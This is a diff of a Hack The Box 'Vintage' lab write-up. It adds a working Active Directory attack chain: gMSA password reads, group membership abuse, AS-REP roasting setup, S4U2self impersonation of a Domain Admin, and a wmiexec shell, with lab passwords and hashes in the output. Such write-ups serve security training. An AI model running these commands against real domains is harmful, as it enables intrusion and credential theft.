@@ -1,3 +1,10 @@
+> [!Note]
+>
+> |User|Root|
+> |---|---|
+> |✅|✅|
+
+
 ![image](https://github.com/user-attachments/assets/8c941618-e932-40c8-9a6d-ebe580342013)
 
 ## 1. Recon
@@ -401,11 +408,11 @@ Saving ticket in FS01$.ccache
 [+] VALID CREDENTIALS: vintage.htb\FS01$:fs01
 ```
 
-### 3.2. Moving to `GMSA01$`
+### 3.2. Moving to `gMSA01$`
 
 Checking the `Group Delegated Object Control` under `Node Info` for `FS01`:
 - `FS01` is a member of `Domain Computers` group
-- `Domain Computers` group has `ReadGMSAPassword` rights to the `GMSA01$` GMSA account
+- `Domain Computers` group has `ReadGMSAPassword` rights to the `gMSA01$` GMSA account
 
 ![image](https://github.com/user-attachments/assets/15393e57-9a89-4654-bc56-778b1d33c7e0)
 
@@ -413,7 +420,7 @@ GMSA was supposedly a way to secure service account passwords, it may ironically
 
 ![image](https://github.com/user-attachments/assets/98841e3f-b19b-4209-b01b-8468efbe7ba5)
 
-Let's use the `ReadGMSAPassword` permission to get the password hash for `GMSA01$`
+Let's use the `ReadGMSAPassword` permission to get the password hash for `gMSA01$`
 
 > [!Tip]
 >
@@ -426,7 +433,7 @@ Let's use the `ReadGMSAPassword` permission to get the password hash for `GMSA01
 ```console
 root@kali:~# export KRB5CCNAME='FS01$.ccache'
 
-root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb -k --dc-ip 10.10.11.45 get object 'GMSA01$' --attr msDS-ManagedPassword
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb -k --dc-ip 10.10.11.45 get object 'gMSA01$' --attr msDS-ManagedPassword
 [+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:FS01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
 [*] Trying to connect to dc01.vintage.htb...
 [+] Connection successful
@@ -438,8 +445,8 @@ msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA
 
 ### 3.3. Moving to `ServiceManagers`
 
-Checking the `First Degree Object Control` under `Node Info` for `GMSA01$`:
-- `GMSA01$` has `AddSelf` and `GenericWrite` rights to `ServiceManagers`
+Checking the `First Degree Object Control` under `Node Info` for `gMSA01$`:
+- `gMSA01$` has `AddSelf` and `GenericWrite` rights to `ServiceManagers`
 
 ![image](https://github.com/user-attachments/assets/ff8f1cc9-8e7e-4d33-927c-a997fe3c0cf2)
 
@@ -451,32 +458,32 @@ GenericWrite:
 
 ![image](https://github.com/user-attachments/assets/49149ccc-d3c3-4cd8-8aa9-4f0992729b3f)
 
-Get a TGT for `GMSA01$` using the password hash retrieved:
+Get a TGT for `gMSA01$` using the password hash retrieved:
 
 ```console
-root@kali:~# impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
+root@kali:~# impacket-getTGT vintage.htb/gMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
-[*] Saving ticket in GMSA01$.ccache
+[*] Saving ticket in gMSA01$.ccache
 
-root@kali:~# export KRB5CCNAME='GMSA01$.ccache'
+root@kali:~# export KRB5CCNAME='gMSA01$.ccache'
 ```
 
-Adding `GMSA01$` self to `ServiceManagers`:
+Adding `gMSA01$` self to `ServiceManagers`:
 
 ```console
-root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add groupMember ServiceManagers 'GMSA01$'
-[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add groupMember ServiceManagers 'gMSA01$'
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:gMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
 [*] Trying to connect to dc01.vintage.htb...
 [+] Connection successful
-[+] GMSA01$ added to ServiceManagers
+[+] gMSA01$ added to ServiceManagers
 ```
 
 Verify membership:
 
 ```console
 root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k get object CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb --attr member
-[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:gMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
 [*] Trying to connect to dc01.vintage.htb...
 [+] Connection successful
 
@@ -493,19 +500,19 @@ Lastly, `ServiceManagers` has `GenericAll` rights to its 3 members: `svc_ark`, `
 Let's set `DONT_REQ_PREAUTH` on these accounts to try and get their password hashes:
 
 ```consoleroot@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_ark -f DONT_REQ_PREAUTH
-[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:gMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
 [*] Trying to connect to dc01.vintage.htb...
 [+] Connection successful
 [-] ['DONT_REQ_PREAUTH'] property flags added to svc_ark's userAccountControl
 
 root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_ldap -f DONT_REQ_PREAUTH
-[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:gMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
 [*] Trying to connect to dc01.vintage.htb...
 [+] Connection successful
 [-] ['DONT_REQ_PREAUTH'] property flags added to svc_ldap's userAccountControl
 
 root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_sql -f DONT_REQ_PREAUTH
-[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:gMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
 [*] Trying to connect to dc01.vintage.htb...
 [+] Connection successful
 [-] ['DONT_REQ_PREAUTH'] property flags added to svc_sql's userAccountControl
@@ -531,8 +538,8 @@ $krb5asrep$23$svc_ldap@VINTAGE.HTB:fa1e8d177ca3b0234cf7561f9e85229f$51634fbe530b
 `KDC_ERR_CLIENT_REVOKED` encountered for `svc_sql`, it's likely that the account is disabled, let's enable it with `bloodyAD`:
 
 ```console
-root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
-[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac svc_sql -f ACCOUNTDISABLE
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:gMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
 [*] Trying to connect to dc01.vintage.htb...
 [+] Connection successful
 [-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
@@ -891,6 +898,8 @@ Unknown     : Uncr4ck4bl3P4ssW0rd0312
 
 ### 4.2. Moving to `L.Bianchi_adm`
 
+#### 4.2.1. Discovering movement pathway
+
 Checking the `First Degree Object Control` under `Node Info` for `C.Neri_adm`:
 - `C.Neri_adm` has `AddSelf` and `GenericWrite` rights to `DelegatedAdmins`
 
@@ -904,3 +913,197 @@ Checking the `Direct Members` under `Node Info` for `DelegatedAdmins`:
 And `L.Bianchi_adm` was previously noted as a member of `Domain Admins`:
 
 ![image](https://github.com/user-attachments/assets/509d5d3a-7072-41ff-a59c-b42ce751cb0d)
+
+#### 4.2.2. [S4U2self abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
+
+> [!Important]
+>
+> Kerberos delegations allow services to access other services on behalf of domain users
+> - Service for User to Self (S4U2self) allows a service to obtain a Service Ticket, on behalf of a user (called "principal"), to itself
+> - S4U2self can be used to produce a Service Ticket to oneself on behalf of another domain user, even if that user is "sensitive for delegation" or member of the Protected Users group
+
+Use `C.Neri_adm` to add `svc_sql` to `DelegatedAdmins` group
+
+```console
+root@kali:~# impacket-getTGT vintage.htb/C.Neri_adm:Uncr4ck4bl3P4ssW0rd0312 -dc-ip dc01.vintage.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in C.Neri_adm.ccache
+
+root@kali:~# export KRB5CCNAME=C.Neri_adm.ccache
+
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add groupMember DelegatedAdmins svc_sql
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:C.Neri_adm.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[*] Trying to connect to dc01.vintage.htb...
+[+] Connection successful
+[+] svc_sql added to DelegatedAdmins
+```
+
+Use `C.Neri` to create a fake SPN `cifs/fake`:
+
+```console
+root@kali:~# impacket-getTGT vintage.htb/C.Neri:Zer0the0ne -dc-ip dc01.vintage.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in C.Neri.ccache
+
+root@kali:~# export KRB5CCNAME=C.Neri.ccache
+
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k set object svc_sql servicePrincipalName -v cifs/fake
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:C.Neri.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[*] Trying to connect to dc01.vintage.htb...
+[+] Connection successful
+[+] svc_sql's servicePrincipalName has been updated
+```
+
+Use `svc_sql` to impersonate `L.Bianchi_adm`:
+
+```console
+root@kali:~# impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in svc_sql.ccache
+
+root@kali:~# export KRB5CCNAME=svc_sql.ccache
+
+root@kali:~# impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate L.Bianchi_adm -dc-ip dc01.vintage.htb -k vintage.htb/svc_sql:Zer0the0ne
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Impersonating L.Bianchi_adm
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in L.Bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
+
+root@kali:~# export KRB5CCNAME=L.Bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
+```
+
+#### 4.2.3. Use `impacket-wmiexec` to connect to `dc01` as `L.Bianchi_adm`
+
+> [!Note]
+>
+> `evil-winrm` doesn't work here, possible because this is a delegated access
+>
+> ```console
+> root@kali:~# evil-winrm -i dc01.vintage.htb -r vintage.htb
+> 
+> Evil-WinRM shell v3.7
+> 
+> Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+> 
+> Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+> 
+> Info: Establishing connection to remote endpoint
+> 
+> Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
+> Matching credential not found (filename: L.Bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache)
+> 
+> 
+> Error: Exiting with code 1
+> ```
+
+```console
+root@kali:~# impacket-wmiexec -k -no-pass vintage.htb/L.Bianchi_adm@dc01.vintage.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+```
+
+Look at the tremedous amount of permissions...:
+
+```cmd
+C:\>whoami /all
+
+USER INFORMATION
+----------------
+
+User Name             SID
+===================== ==============================================
+vintage\l.bianchi_adm S-1-5-21-4024337825-2033394866-2055507597-1141
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                     Type             SID                                            Attributes
+============================================== ================ ============================================== ===============================================================
+Everyone                                       Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                                  Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access     Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                         Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+VINTAGE\Domain Admins                          Group            S-1-5-21-4024337825-2033394866-2055507597-512  Mandatory group, Enabled by default, Enabled group
+VINTAGE\DelegatedAdmins                        Group            S-1-5-21-4024337825-2033394866-2055507597-1131 Mandatory group, Enabled by default, Enabled group
+Service asserted identity                      Well-known group S-1-18-2                                       Mandatory group, Enabled by default, Enabled group
+VINTAGE\Denied RODC Password Replication Group Alias            S-1-5-21-4024337825-2033394866-2055507597-572  Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\High Mandatory Level           Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+Get `root.txt`:
+
+```cmd
+C:\>dir /s C:\*root.txt
+ Volume in drive C has no label.
+ Volume Serial Number is B8C0-0CD3
+
+ Directory of C:\Documents and Settings\Administrator\Desktop
+
+12/31/2024  09:46 PM                34 root.txt
+               1 File(s)             34 bytes
+
+ Directory of C:\Users\Administrator\Desktop
+
+12/31/2024  09:46 PM                34 root.txt
+               1 File(s)             34 bytes
+
+     Total Files Listed:
+               2 File(s)             68 bytes
+               0 Dir(s)   5,765,349,376 bytes free
+
+C:\>type C:\Users\Administrator\Desktop\root.txt
+9a41664eceb2b3deb9e359844df06a68
+```
